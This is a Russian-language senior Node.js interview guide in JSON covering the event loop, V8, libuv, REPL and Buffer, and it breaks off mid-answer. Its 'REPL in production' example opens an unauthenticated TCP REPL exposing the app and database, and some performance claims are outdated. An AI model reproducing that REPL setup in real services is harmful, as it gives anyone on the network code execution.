{
  "guide_metadata": {
    "created_date": "2025-11-08",
    "target_audience": "Senior разработчики",
    "covered_versions": "",
    "language": "Русский",
    "total_questions": 51,
    "total_chapters": 7,
    "difficulty_level": "Senior",
    "tags": [
      "Node.js",
      "Backend",
      "JavaScript"
    ]
  },
  "guide_name": "Гайд по Node.js для Senior Backend Разработчика",
  "guide_description": "",
  "guide_table_of_contents": [],
  "guide_chapters": [
    {
      "chapter_number": 1,
      "chapter_title": "Node.js Core & Architecture",
      "questions_count": 10,
      "questions": [
        {
          "question_number": 1,
          "question_number_in_chapter": 1,
          "question_chapter": 1,
          "question_title": "Что такое Node.js и как он работает?",
          "answer_markdown": "\n**Ответ:**\n\nNode.js - это серверная JavaScript runtime среда, построенная на движке V8 от Google. Node.js использует событийно-управляемую (event-driven), неблокирующую модель I/O, что делает его легковесным и эффективным.\n\n**Основные компоненты Node.js:**\n\n1. **V8 Engine** - компилирует JavaScript в машинный код для быстрого выполнения\n2. **Libuv** - библиотека на C++, обеспечивающая:\n   - Event Loop\n   - Thread pool для асинхронных операций\n   - Кроссплатформенную поддержку I/O\n3. **Node.js Bindings** - связь между V8 и Libuv\n4. **Node.js Standard Library** - встроенные модули (fs, http, crypto и т.д.)\n\n**Как это работает:**\n\n```javascript\n// Клиент делает запрос\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Node.js не блокируется на этом запросе\n  // Передает его в Event Loop\n\n  // Асинхронная операция чтения файла\n  fs.readFile('data.txt', (err, data) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('Error');\n      return;\n    }\n    res.writeHead(200);\n    res.end(data);\n  });\n\n  // Node.js сразу переходит к обработке следующего запроса\n});\n\nserver.listen(3000);\n```\n\nКогда приходит запрос:\n1. Запрос принимается основным потоком\n2. Асинхронные операции (I/O) делегируются Libuv\n3. Основной поток продолжает принимать новые запросы\n4. Когда операция завершена, callback добавляется в очередь Event Loop\n5. Event Loop выполняет callback когда call stack пуст\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 2,
          "question_number_in_chapter": 2,
          "question_chapter": 1,
          "question_title": "Почему Node.js однопоточный, но может обрабатывать множество одновременных запросов?",
          "answer_markdown": "\n**Ответ:**\n\nNode.js однопоточный **только для JavaScript кода**, но он может обрабатывать тысячи одновременных запросов благодаря:\n\n**1. Event-Driven, Non-Blocking I/O архитектуре:**\n\n```javascript\n// Традиционный blocking подход (НЕ Node.js)\nconst data1 = readFileSync('file1.txt');  // БЛОКИРОВКА\nconst data2 = readFileSync('file2.txt');  // БЛОКИРОВКА\nconst data3 = readFileSync('file3.txt');  // БЛОКИРОВКА\n\n// Node.js non-blocking подход\nreadFile('file1.txt', callback1);  // НЕ блокирует\nreadFile('file2.txt', callback2);  // НЕ блокирует\nreadFile('file3.txt', callback3);  // НЕ блокирует\n// Продолжает выполнение\n```\n\n**2. Libuv Thread Pool:**\n\nNode.js использует пул потоков (по умолчанию 4 потока) для:\n- Файловых операций\n- DNS резолвинга\n- Некоторых криптографических операций\n- Сжатия/декомпрессии\n\n```javascript\n// Эти операции выполняются в thread pool\nconst crypto = require('crypto');\n\ncrypto.pbkdf2('password', 'salt', 100000, 64, 'sha512', (err, key) => {\n  // Эта тяжелая операция выполнялась в отдельном потоке\n  console.log(key.toString('hex'));\n});\n\n// Основной поток продолжает работу\nconsole.log('Продолжаю работать...');\n```\n\n**3. Event Loop координирует все:**\n\n- Принимает запросы\n- Делегирует I/O операции\n- Обрабатывает callbacks когда операции завершены\n\n**Пример обработки 1000 запросов:**\n\n```javascript\nconst http = require('http');\n\nhttp.createServer((req, res) => {\n  // Каждый запрос обрабатывается асинхронно\n  // Node.js НЕ создает новый поток для каждого запроса\n\n  db.query('SELECT * FROM users', (err, users) => {\n    res.json(users);\n  });\n\n  // Сразу переходит к следующему запросу\n}).listen(3000);\n\n// Node.js может обрабатывать тысячи запросов\n// потому что не блокируется на I/O операциях\n```\n\n**Ключевое отличие от многопоточных серверов:**\n\n- **Apache/PHP**: создает новый поток/процесс для каждого запроса (дорого)\n- **Node.js**: один поток обрабатывает все запросы асинхронно (эффективно)\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 3,
          "question_number_in_chapter": 3,
          "question_chapter": 1,
          "question_title": "Что такое Event Loop и какие у него фазы?",
          "answer_markdown": "\n**Ответ:**\n\n**Event Loop** - это механизм, который позволяет Node.js выполнять неблокирующие операции, несмотря на то что JavaScript однопоточный. Event Loop постоянно проверяет очереди задач и выполняет их.\n\n**Фазы Event Loop (в порядке выполнения):**\n\n```\n   ┌───────────────────────────┐\n┌─>│           timers          │ - setTimeout, setInterval callbacks\n│  └─────────────┬─────────────┘\n│  ┌─────────────┴─────────────┐\n│  │     pending callbacks     │ - I/O callbacks отложенные с прошлой итерации\n│  └─────────────┬─────────────┘\n│  ┌─────────────┴─────────────┐\n│  │       idle, prepare       │ - внутренние операции Node.js\n│  └─────────────┬─────────────┘\n│  ┌─────────────┴─────────────┐\n│  │           poll            │ - новые I/O события, выполнение I/O callbacks\n│  └─────────────┬─────────────┘\n│  ┌─────────────┴─────────────┐\n│  │           check           │ - setImmediate callbacks\n│  └─────────────┬─────────────┘\n│  ┌─────────────┴─────────────┐\n│  │      close callbacks      │ - socket.on('close', ...)\n│  └───────────────────────────┘\n└──────────────────────────────┘\n```\n\n**Детальное описание фаз:**\n\n**1. Timers:**\n- Выполняет callbacks из `setTimeout` и `setInterval`\n- НЕ гарантирует точное время (зависит от других операций)\n\n```javascript\nsetTimeout(() => {\n  console.log('Выполнено через ~1000ms');\n}, 1000);\n```\n\n**2. Pending Callbacks:**\n- Выполняет системные callbacks (ошибки TCP)\n\n**3. Idle, Prepare:**\n- Внутренние операции Node.js\n\n**4. Poll (самая важная фаза):**\n- Ожидает новые I/O события\n- Выполняет I/O callbacks\n- Если очередь пуста - ждет или переходит к check\n\n```javascript\nfs.readFile('file.txt', (err, data) => {\n  // Этот callback выполнится в poll фазе\n  console.log(data);\n});\n```\n\n**5. Check:**\n- Выполняет `setImmediate` callbacks\n\n```javascript\nsetImmediate(() => {\n  console.log('Выполнено в check фазе');\n});\n```\n\n**6. Close Callbacks:**\n- Выполняет callbacks закрытия (например, `socket.on('close')`)\n\n**Дополнительные очереди:**\n\n**process.nextTick()** - выполняется ПЕРЕД следующей фазой:\n```javascript\nprocess.nextTick(() => {\n  console.log('Выполнено ДО следующей фазы Event Loop');\n});\n```\n\n**Promise Microtask Queue** - выполняется после `nextTick`:\n```javascript\nPromise.resolve().then(() => {\n  console.log('Promise microtask');\n});\n```\n\n**Пример порядка выполнения:**\n\n```javascript\nconsole.log('1');\n\nsetTimeout(() => console.log('2: setTimeout'), 0);\n\nsetImmediate(() => console.log('3: setImmediate'));\n\nprocess.nextTick(() => console.log('4: nextTick'));\n\nPromise.resolve().then(() => console.log('5: Promise'));\n\nconsole.log('6');\n\n// Результат:\n// 1\n// 6\n// 4: nextTick\n// 5: Promise\n// 2: setTimeout (или 3: setImmediate - порядок может меняться)\n// 3: setImmediate (или 2: setTimeout)\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 4,
          "question_number_in_chapter": 4,
          "question_chapter": 1,
          "question_title": "В чем разница между process.nextTick() и setImmediate()?",
          "answer_markdown": "\n**Ответ:**\n\nЭто один из самых частых вопросов на интервью, и он может быть запутанным из-за названий.\n\n**process.nextTick():**\n- Выполняется **ДО** следующей фазы Event Loop\n- Выполняется **немедленно** после текущей операции\n- Имеет **наивысший приоритет**\n- Может привести к **блокировке Event Loop** если использовать рекурсивно\n\n**setImmediate():**\n- Выполняется в **check фазе** Event Loop\n- Выполняется в **следующей итерации** Event Loop\n- Более \"справедливый\" - не блокирует Event Loop\n\n**Таблица сравнения:**\n\n| Характеристика | process.nextTick() | setImmediate() |\n|----------------|-------------------|----------------|\n| Когда выполняется | До следующей фазы | В check фазе |\n| Приоритет | Высший | Нормальный |\n| Очередь | nextTick queue | Check queue |\n| Риск блокировки | Да | Нет |\n| Порядок | Всегда раньше | После I/O |\n\n**Пример 1 - Порядок выполнения:**\n\n```javascript\nsetImmediate(() => {\n  console.log('setImmediate');\n});\n\nprocess.nextTick(() => {\n  console.log('nextTick');\n});\n\n// Результат ВСЕГДА:\n// nextTick\n// setImmediate\n```\n\n**Пример 2 - Внутри I/O операции:**\n\n```javascript\nconst fs = require('fs');\n\nfs.readFile('file.txt', () => {\n  setTimeout(() => console.log('setTimeout'), 0);\n  setImmediate(() => console.log('setImmediate'));\n});\n\n// Результат ВСЕГДА (внутри I/O callback):\n// setImmediate\n// setTimeout\n```\n\n**Пример 3 - Блокировка Event Loop (ПЛОХО!):**\n\n```javascript\n// ❌ ПЛОХО - блокирует Event Loop\nfunction recursiveNextTick() {\n  process.nextTick(() => {\n    console.log('nextTick');\n    recursiveNextTick(); // Бесконечная рекурсия\n  });\n}\n\nrecursiveNextTick();\n// Event Loop заблокирован! Другие операции не выполняются\n\n// ✅ ХОРОШО - не блокирует\nfunction recursiveImmediate() {\n  setImmediate(() => {\n    console.log('setImmediate');\n    recursiveImmediate();\n  });\n}\n\nrecursiveImmediate();\n// Event Loop продолжает работать между вызовами\n```\n\n**Когда использовать:**\n\n**process.nextTick():**\n- Когда нужно выполнить callback до любых I/O операций\n- Для обработки ошибок\n- Для выполнения cleanup операций\n\n```javascript\nfunction MyEmitter() {\n  EventEmitter.call(this);\n\n  // Плохо - emit до того как пользователь установит listeners\n  // this.emit('event');\n\n  // Хорошо - дать пользователю время установить listeners\n  process.nextTick(() => {\n    this.emit('event');\n  });\n}\n```\n\n**setImmediate():**\n- Когда нужно выполнить callback после I/O операций\n- Для разбиения тяжелых вычислений\n- Когда не нужна высшая приоритетность\n\n```javascript\nfunction heavyComputation(data) {\n  // Разбиваем на части чтобы не блокировать Event Loop\n  const chunk = data.slice(0, 1000);\n\n  // Обрабатываем chunk\n  process(chunk);\n\n  if (data.length > 1000) {\n    setImmediate(() => {\n      heavyComputation(data.slice(1000));\n    });\n  }\n}\n```\n\n**Рекомендация:**\nВ большинстве случаев используйте `setImmediate()` - он более предсказуемый и безопасный.\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 5,
          "question_number_in_chapter": 5,
          "question_chapter": 1,
          "question_title": "Что такое V8 Engine и как он работает?",
          "answer_markdown": "\n**Ответ:**\n\n**V8** - это высокопроизводительный JavaScript и WebAssembly движок с открытым исходным кодом, разработанный Google. Он написан на C++ и используется как в Google Chrome, так и в Node.js.\n\n**Основные функции V8:**\n\n1. **Компиляция JavaScript в машинный код**\n2. **Управление памятью и сборка мусора (Garbage Collection)**\n3. **Оптимизация выполнения кода**\n\n**Архитектура V8:**\n\n```\nJavaScript код\n      ↓\n   Parser (Парсер)\n      ↓\n   AST (Abstract Syntax Tree)\n      ↓\n   Ignition (Интерпретатор)\n      ↓\n   Bytecode\n      ↓\n   TurboFan (Оптимизирующий компилятор)\n      ↓\n   Machine Code (Машинный код)\n```\n\n**Процесс работы V8:**\n\n**1. Parsing (Парсинг):**\n- Преобразует JavaScript в Abstract Syntax Tree (AST)\n\n**2. Ignition (Интерпретатор):**\n- Преобразует AST в bytecode\n- Быстро начинает выполнение\n- Собирает информацию о типах (profiling)\n\n**3. TurboFan (Оптимизирующий компилятор):**\n- Компилирует \"горячий\" код (часто выполняемый) в оптимизированный машинный код\n- Использует информацию о типах из Ignition\n\n**4. Deoptimization (Деоптимизация):**\n- Если предположения о типах оказались неверными, возвращается к bytecode\n\n**Пример оптимизации:**\n\n```javascript\n// V8 оптимизирует эту функцию\nfunction add(a, b) {\n  return a + b;\n}\n\n// Первые вызовы - Ignition собирает информацию\nadd(1, 2);      // V8 видит: числа\nadd(3, 4);      // V8 видит: опять числа\nadd(5, 6);      // V8 видит: снова числа\n\n// После нескольких вызовов TurboFan создает оптимизированный код:\n// \"add всегда принимает числа и возвращает число\"\n\n// Но если вдруг:\nadd(\"hello\", \"world\");  // Деоптимизация!\n// V8 понимает что предположение неверно и возвращается к bytecode\n```\n\n**Сборка мусора (Garbage Collection):**\n\nV8 использует **generational garbage collection**:\n\n**1. Young Generation (Новое поколение):**\n- Небольшая область памяти для новых объектов\n- Быстрая сборка мусора (Scavenger)\n- Разделена на two semi-spaces\n\n**2. Old Generation (Старое поколение):**\n- Для объектов, переживших несколько сборок\n- Медленная сборка (Mark-Sweep-Compact)\n\n```javascript\n// Новый объект создается в Young Generation\nlet obj = { name: 'John' };\n\n// Если obj проживет несколько GC циклов,\n// он переместится в Old Generation\n\n// Когда obj больше не нужен\nobj = null;  // Будет удален при следующей GC\n```\n\n**Hidden Classes (Скрытые классы):**\n\nV8 создает скрытые классы для оптимизации доступа к свойствам:\n\n```javascript\n// ✅ ХОРОШО - один hidden class\nfunction Point(x, y) {\n  this.x = x;  // Hidden class 0\n  this.y = y;  // Hidden class 1\n}\n\nconst p1 = new Point(1, 2);\nconst p2 = new Point(3, 4);\n// p1 и p2 используют один hidden class - БЫСТРО\n\n// ❌ ПЛОХО - разные hidden classes\nconst p3 = new Point(5, 6);\np3.z = 7;  // Новый hidden class!\n// p3 использует другой hidden class - МЕДЛЕННЕЕ\n```\n\n**Inline Caching:**\n\nV8 кэширует результаты поиска свойств:\n\n```javascript\nfunction getX(point) {\n  return point.x;  // V8 запоминает где находится 'x'\n}\n\n// При повторных вызовах с объектами одного типа - БЫСТРО\ngetX({ x: 1, y: 2 });\ngetX({ x: 3, y: 4 });\n```\n\n**Советы по оптимизации для V8:**\n\n```javascript\n// 1. Используйте мономорфные функции (один тип аргументов)\n// ✅ ХОРОШО\nfunction add(a, b) {\n  return a + b;\n}\nadd(1, 2);\nadd(3, 4);\n\n// ❌ ПЛОХО\nadd(1, 2);\nadd(\"a\", \"b\");  // Полиморфизм - медленнее\n\n// 2. Избегайте delete\n// ✅ ХОРОШО\nobj.x = undefined;\n\n// ❌ ПЛОХО\ndelete obj.x;  // Меняет hidden class\n\n// 3. Инициализируйте все свойства в конструкторе\n// ✅ ХОРОШО\nfunction Point(x, y) {\n  this.x = x;\n  this.y = y;\n  this.z = 0;  // Даже если пока не используется\n}\n\n// 4. Используйте try-catch осторожно\n// try-catch блоки не оптимизируются TurboFan\nfunction riskyOperation() {\n  try {\n    // Код который может выбросить ошибку\n    throw new Error();\n  } catch (e) {\n    // Обработка\n  }\n}\n// Выносите критический код из try-catch\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 6,
          "question_number_in_chapter": 6,
          "question_chapter": 1,
          "question_title": "Что такое Libuv и какова его роль в Node.js?",
          "answer_markdown": "\n**Ответ:**\n\n**Libuv** - это мультиплатформенная библиотека на C, которая обеспечивает Node.js возможностью выполнять асинхронные I/O операции. Это \"сердце\" Node.js в плане работы с операционной системой.\n\n**Основные функции Libuv:**\n\n1. **Event Loop** - основной механизм обработки асинхронных событий\n2. **Thread Pool** - пул потоков для CPU-intensive и некоторых I/O операций\n3. **Асинхронный I/O** - работа с файлами, сетью, сокетами\n4. **Кроссплатформенность** - единый API для разных ОС\n\n**Архитектура:**\n\n```\n┌─────────────────────────────┐\n│      Node.js Application    │\n├─────────────────────────────┤\n│      V8 JavaScript Engine   │\n├─────────────────────────────┤\n│    Node.js Bindings (C++)   │\n├─────────────────────────────┤\n│         Libuv (C)           │ ←─ Event Loop, Thread Pool\n├─────────────────────────────┤\n│    Operating System         │\n│  (Windows, Linux, macOS)    │\n└─────────────────────────────┘\n```\n\n**Thread Pool:**\n\nПо умолчанию Libuv создает пул из **4 потоков** (можно изменить через `UV_THREADPOOL_SIZE`):\n\n```javascript\n// Операции выполняющиеся в thread pool:\n// 1. Файловые операции\nfs.readFile('file.txt', callback);\n\n// 2. DNS резолвинг\ndns.lookup('google.com', callback);\n\n// 3. Некоторые криптографические операции\ncrypto.pbkdf2('password', 'salt', 100000, 64, 'sha512', callback);\n\n// 4. Сжатие/декомпрессия\nzlib.gzip(buffer, callback);\n\n// Настройка размера thread pool\nprocess.env.UV_THREADPOOL_SIZE = 8;  // Увеличиваем до 8 потоков\n```\n\n**Какие операции используют Thread Pool:**\n\n```javascript\nconst crypto = require('crypto');\nconst fs = require('fs');\n\n// Thread Pool (CPU-intensive)\ncrypto.pbkdf2('pass', 'salt', 100000, 64, 'sha512', () => {\n  console.log('Crypto done'); // Выполнялось в thread pool\n});\n\n// Thread Pool (File I/O)\nfs.readFile('file.txt', () => {\n  console.log('File read'); // Выполнялось в thread pool\n});\n\n// НЕ Thread Pool (Network I/O - использует OS async API)\nhttps.get('https://google.com', () => {\n  console.log('HTTP done'); // Выполнялось через epoll/kqueue/IOCP\n});\n```\n\n**Кроссплатформенная поддержка:**\n\nLibuv предоставляет единый API, но использует разные механизмы ОС:\n\n- **Linux**: epoll\n- **macOS**: kqueue\n- **Windows**: IOCP (I/O Completion Ports)\n\n```javascript\n// Один и тот же код работает на всех платформах\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Libuv использует epoll/kqueue/IOCP под капотом\n    console.log(data.toString());\n  });\n});\n\nserver.listen(3000);\n```\n\n**Event Loop в Libuv:**\n\nLibuv реализует Event Loop с фазами которые мы уже рассмотрели:\n\n```c\n// Псевдокод Event Loop в Libuv\nwhile (alive) {\n  uv_update_time(loop);           // Обновить время\n  uv_run_timers(loop);            // Выполнить таймеры\n  uv_run_pending(loop);           // Pending callbacks\n  uv_run_idle(loop);              // Idle callbacks\n  uv_run_prepare(loop);           // Prepare callbacks\n\n  uv_io_poll(loop);               // Poll для I/O (самая важная часть)\n\n  uv_run_check(loop);             // Check callbacks (setImmediate)\n  uv_run_closing_handles(loop);  // Close callbacks\n}\n```\n\n**Производительность:**\n\nLibuv позволяет Node.js эффективно обрабатывать тысячи одновременных соединений:\n\n```javascript\nconst http = require('http');\n\n// Один поток + Libuv может обработать >10,000 req/sec\nhttp.createServer((req, res) => {\n  res.end('Hello');\n}).listen(3000);\n\n// Libuv эффективно управляет:\n// - Приемом соединений\n// - Чтением/записью данных\n// - Таймаутами\n// - Без создания тысяч потоков\n```\n\n**Почему Libuv, а не просто OS API:**\n\n1. **Кроссплатформенность** - один код для всех ОС\n2. **Thread Pool** - для операций которые ОС не может сделать асинхронно\n3. **Единый Event Loop** - упрощает модель программирования\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 7,
          "question_number_in_chapter": 7,
          "question_chapter": 1,
          "question_title": "Может ли Node.js работать без V8? Может ли V8 работать без Libuv?",
          "answer_markdown": "\n**Ответ:**\n\n**Может ли Node.js работать без V8?**\n\nНет, текущая версия Node.js **не может** работать без V8. Однако:\n\n**Технически возможно** использовать другой JavaScript движок:\n- **Node-ChakraCore** - проект Microsoft для запуска Node.js на движке ChakraCore (Edge)\n- Требует значительных изменений в Node.js core\n\n```javascript\n// V8-специфичные вещи в Node.js:\nconst v8 = require('v8');\n\n// Информация о heap\nconsole.log(v8.getHeapStatistics());\n\n// V8 флаги\nnode --max-old-space-size=4096 app.js\n```\n\n**Зависимость Node.js от V8:**\n\n```\nNode.js Code\n     ↓\nV8 JavaScript Engine  ←─ Компиляция JS → Machine Code\n     ↓\nNode.js C++ Bindings  ←─ Используют V8 API\n     ↓\nLibuv\n```\n\n**Может ли V8 работать без Libuv?**\n\nДа! V8 - это **независимый** JavaScript движок. Он используется:\n\n**1. В Google Chrome** (без Libuv):\n```\nChrome Browser\n     ↓\nV8 Engine\n     ↓\nBlink (rendering engine)\n     ↓\nOS APIs\n```\n\n**2. В других проектах**:\n- Cloudflare Workers\n- MongoDB (для server-side scripting)\n- Electron (использует и V8 и Libuv через Node.js)\n\n**Пример использования V8 отдельно:**\n\n```cpp\n// C++ код использующий V8 напрямую (без Node.js/Libuv)\n#include <v8.h>\n\nint main() {\n  v8::Isolate* isolate = v8::Isolate::New();\n  v8::HandleScope handle_scope(isolate);\n  v8::Local<v8::Context> context = v8::Context::New(isolate);\n\n  // Выполнить JavaScript\n  v8::Local<v8::String> source =\n    v8::String::NewFromUtf8(isolate, \"1 + 2\").ToLocalChecked();\n  v8::Local<v8::Script> script =\n    v8::Script::Compile(context, source).ToLocalChecked();\n  v8::Local<v8::Value> result =\n    script->Run(context).ToLocalChecked();\n\n  // Результат: 3\n  return 0;\n}\n```\n\n**Что дает связка V8 + Libuv в Node.js:**\n\n```javascript\n// V8 выполняет этот код\nconst fs = require('fs');\n\n// Но fs.readFile - это binding к Libuv\nfs.readFile('file.txt', (err, data) => {\n  // V8 выполняет callback\n  // Но операция чтения была в Libuv\n  console.log(data);\n});\n```\n\n**Схема взаимодействия:**\n\n```\n┌──────────────────────────────┐\n│   JavaScript Code            │\n└──────────────┬───────────────┘\n               │ выполняется\n               ↓\n┌──────────────────────────────┐\n│   V8 Engine                  │\n│   - Компилирует JS           │\n│   - Выполняет JS             │\n│   - Управляет памятью        │\n└──────────────┬───────────────┘\n               │ вызывает\n               ↓\n┌──────────────────────────────┐\n│   Node.js Bindings (C++)     │\n│   - fs, http, crypto, etc    │\n└──────────────┬───────────────┘\n               │ использует\n               ↓\n┌──────────────────────────────┐\n│   Libuv (C)                  │\n│   - Event Loop               │\n│   - Thread Pool              │\n│   - Async I/O                │\n└──────────────┬───────────────┘\n               │\n               ↓\n┌──────────────────────────────┐\n│   Operating System           │\n└──────────────────────────────┘\n```\n\n**Резюме:**\n\n| Компонент | Может работать отдельно? | Зависимости |\n|-----------|-------------------------|-------------|\n| V8 | ✅ Да | Нет (независимый движок) |\n| Libuv | ✅ Да | Нет (C библиотека) |\n| Node.js | ❌ Нет | Требует V8 (текущая реализация) |\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 8,
          "question_number_in_chapter": 8,
          "question_chapter": 1,
          "question_title": "Что такое REPL в Node.js?",
          "answer_markdown": "\n**Ответ:**\n\n**REPL** расшифровывается как **Read-Eval-Print-Loop** (Чтение-Выполнение-Вывод-Цикл). Это интерактивная среда для выполнения JavaScript кода в Node.js.\n\n**Компоненты REPL:**\n\n1. **Read** - читает ввод пользователя\n2. **Eval** - выполняет JavaScript код\n3. **Print** - выводит результат\n4. **Loop** - возвращается к шагу 1\n\n**Запуск REPL:**\n\n```bash\n$ node\n>\n# Вы в REPL!\n```\n\n**Основные возможности:**\n\n```javascript\n// 1. Простые выражения\n> 1 + 2\n3\n\n// 2. Переменные (без let/const в REPL часто)\n> const x = 10\nundefined\n> x * 2\n20\n\n// 3. Функции\n> function add(a, b) { return a + b; }\nundefined\n> add(5, 3)\n8\n\n// 4. Многострочный ввод\n> function multiply(a, b) {\n... return a * b;\n... }\nundefined\n> multiply(4, 5)\n20\n\n// 5. Встроенные модули\n> const fs = require('fs')\nundefined\n> fs.readdirSync('.')\n[ 'file1.txt', 'file2.js', ... ]\n\n// 6. Специальные команды\n> .help      // Показать помощь\n> .break     // Выйти из многострочного режима\n> .clear     // Очистить контекст\n> .exit      // Выйти из REPL\n> .save      // Сохранить сессию в файл\n> .load      // Загрузить файл в сессию\n\n// 7. Underscore (_) - результат последнего выражения\n> 2 + 2\n4\n> _ * 2\n8\n> _\n8\n```\n\n**Программное использование REPL:**\n\n```javascript\n// Создание собственного REPL\nconst repl = require('repl');\n\n// Базовый REPL\nrepl.start('> ');\n\n// REPL с контекстом\nconst replServer = repl.start({\n  prompt: 'my-app> ',\n  useColors: true,\n  useGlobal: false\n});\n\n// Добавление переменных в контекст\nreplServer.context.myVar = 'Hello';\nreplServer.context.myFunc = function() {\n  return 'World';\n};\n\n// Теперь в REPL доступны myVar и myFunc:\n// my-app> myVar\n// 'Hello'\n// my-app> myFunc()\n// 'World'\n```\n\n**Кастомизация REPL:**\n\n```javascript\nconst repl = require('repl');\n\nconst replServer = repl.start({\n  prompt: '→ ',\n  eval: (cmd, context, filename, callback) => {\n    // Кастомная логика выполнения\n    console.log('Вы ввели:', cmd);\n    callback(null, eval(cmd));\n  },\n  writer: (output) => {\n    // Кастомный формат вывода\n    return `Result: ${output}`;\n  }\n});\n\n// Добавление команды\nreplServer.defineCommand('hello', {\n  help: 'Say hello',\n  action(name) {\n    this.clearBufferedCommand();\n    console.log(`Hello, ${name}!`);\n    this.displayPrompt();\n  }\n});\n\n// Использование:\n// → .hello John\n// Hello, John!\n```\n\n**REPL History:**\n\n```bash\n# История сохраняется автоматически\n# Linux/Mac: ~/.node_repl_history\n# Windows: %USERPROFILE%\\.node_repl_history\n\n# Навигация по истории:\n# ↑ - предыдущая команда\n# ↓ - следующая команда\n```\n\n**Полезные возможности:**\n\n```javascript\n// 1. Tab completion\n> const fs = require('fs')\n> fs.re[TAB]\nfs.read       fs.readFile    fs.readFileSync\nfs.readdir    fs.readdirSync fs.readlink\n\n// 2. Инспекция объектов\n> const obj = { a: 1, b: { c: 2 } }\n> obj\n{ a: 1, b: { c: 2 } }\n\n// 3. Асинхронный код\n> const p = new Promise(resolve => setTimeout(() => resolve('done'), 1000))\n> p.then(console.log)\nPromise { <pending> }\n> done  // Через 1 секунду\n\n// 4. Top-level await (Node.js 14.8+)\n> await fetch('https://api.example.com')\nResponse { ... }\n```\n\n**Практическое применение:**\n\n```javascript\n// 1. Быстрое тестирование API\n$ node\n> const axios = require('axios')\n> const response = await axios.get('https://api.github.com/users/github')\n> response.data.login\n'github'\n\n// 2. Проверка модулей\n> const crypto = require('crypto')\n> crypto.randomBytes(16).toString('hex')\n'a1b2c3d4e5f6...'\n\n// 3. Дебаггинг\n> require('./myModule').myFunction()\n// Быстро проверить работу функции\n\n// 4. Обучение\n> [1,2,3].map(x => x * 2)\n[2, 4, 6]\n```\n\n**REPL в продакшене:**\n\n```javascript\n// Добавление REPL в работающее приложение для дебаггинга\nconst net = require('net');\nconst repl = require('repl');\n\n// REPL через TCP сокет\nnet.createServer((socket) => {\n  const r = repl.start({\n    prompt: 'debug> ',\n    input: socket,\n    output: socket,\n    terminal: true,\n    useGlobal: false\n  });\n\n  r.context.app = app;  // Доступ к приложению\n  r.context.db = db;    // Доступ к базе данных\n\n  r.on('exit', () => {\n    socket.end();\n  });\n}).listen(5001);\n\n// Подключение: telnet localhost 5001\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 9,
          "question_number_in_chapter": 9,
          "question_chapter": 1,
          "question_title": "Что такое Buffer и зачем он нужен?",
          "answer_markdown": "\n**Ответ:**\n\n**Buffer** - это класс в Node.js для работы с **бинарными данными**. Это по сути массив байтов фиксированной длины, который находится вне V8 heap (в нативной памяти C++).\n\n**Зачем нужны Buffer:**\n\nJavaScript изначально не имел хорошей поддержки бинарных данных. Buffer решает эту проблему для:\n- Работы с файлами\n- Сетевых операций (TCP/UDP)\n- Работы с изображениями, аудио, видео\n- Криптографии\n- Сжатия данных\n\n**Создание Buffer:**\n\n```javascript\n// 1. Из строки\nconst buf1 = Buffer.from('Hello');\nconsole.log(buf1);  // <Buffer 48 65 6c 6c 6f>\n\n// 2. Из массива байтов\nconst buf2 = Buffer.from([72, 101, 108, 108, 111]);\nconsole.log(buf2.toString());  // 'Hello'\n\n// 3. Выделение памяти (заполнен нулями)\nconst buf3 = Buffer.alloc(10);\nconsole.log(buf3);  // <Buffer 00 00 00 00 00 00 00 00 00 00>\n\n// 4. Выделение небезопасное (быстрее, но может содержать старые данные)\nconst buf4 = Buffer.allocUnsafe(10);\n// ⚠️ Может содержать остатки данных из памяти!\n\n// 5. С заполнением\nconst buf5 = Buffer.alloc(10, 'a');\nconsole.log(buf5.toString());  // 'aaaaaaaaaa'\n```\n\n**Работа с кодировками:**\n\n```javascript\nconst buf = Buffer.from('Привет', 'utf8');\n\n// Различные кодировки\nconsole.log(buf.toString('utf8'));    // 'Привет'\nconsole.log(buf.toString('hex'));     // 'd09fd180d0b8d0b2d0b5d182'\nconsole.log(buf.toString('base64'));  // '0J/RgNC40LLQtdGC'\n\n// ASCII (только для английского)\nconst asciiБуф = Buffer.from('Hello', 'ascii');\nconsole.log(asciiБуф.toString());  // 'Hello'\n```\n\n**Операции с Buffer:**\n\n```javascript\nconst buf = Buffer.from('Hello World');\n\n// 1. Длина\nconsole.log(buf.length);  // 11\n\n// 2. Доступ к байтам\nconsole.log(buf[0]);      // 72 (код 'H')\nbuf[0] = 74;              // Заменить на 'J'\nconsole.log(buf.toString());  // 'Jello World'\n\n// 3. Слайсы (создает view, не копию!)\nconst slice = buf.slice(0, 5);\nconsole.log(slice.toString());  // 'Jello'\nslice[0] = 77;  // 'M'\nconsole.log(buf.toString());  // 'Mello World' - оригинал тоже изменился!\n\n// 4. Копирование\nconst copy = Buffer.alloc(5);\nbuf.copy(copy, 0, 0, 5);\ncopy[0] = 90;  // 'Z'\nconsole.log(buf.toString());   // 'Mello World' - оригинал НЕ изменился\nconsole.log(copy.toString());  // 'Zello'\n\n// 5. Конкатенация\nconst buf1 = Buffer.from('Hello ');\nconst buf2 = Buffer.from('World');\nconst result = Buffer.concat([buf1, buf2]);\nconsole.log(result.toString());  // 'Hello World'\n\n// 6. Сравнение\nconst a = Buffer.from('abc');\nconst b = Buffer.from('abd');\nconsole.log(a.compare(b));  // -1 (a < b)\nconsole.log(a.equals(b));   // false\n```\n\n**Buffer в файловых операциях:**\n\n```javascript\nconst fs = require('fs');\n\n// Чтение файла как Buffer\nfs.readFile('image.png', (err, data) => {\n  console.log(Buffer.isBuffer(data));  // true\n  console.log(data.length);  // Размер файла в байтах\n\n  // Можно работать с бинарными данными\n  const header = data.slice(0, 8);\n  console.log(header);  // PNG header bytes\n});\n\n// Запись Buffer в файл\nconst buffer = Buffer.from('Some data');\nfs.writeFile('output.txt', buffer, (err) => {\n  console.log('Файл 